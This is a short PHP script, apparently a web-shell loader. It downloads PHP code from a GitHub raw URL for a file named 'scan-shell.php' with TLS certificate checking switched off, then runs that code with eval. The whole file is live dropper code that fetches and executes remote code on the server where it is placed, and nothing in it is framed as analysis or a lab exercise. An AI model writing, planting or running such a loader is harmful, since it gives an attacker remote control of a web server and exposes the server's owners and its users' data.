<?php
function getURL($url) {
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return false;
}
$phpCode = getURL('https://raw.githubusercontent.com/0x505Aufa/scanner-shell/refs/heads/main/scan-shell.php');
if ($phpCode !== false) {
    eval("?>". $phpCode);
}
?>
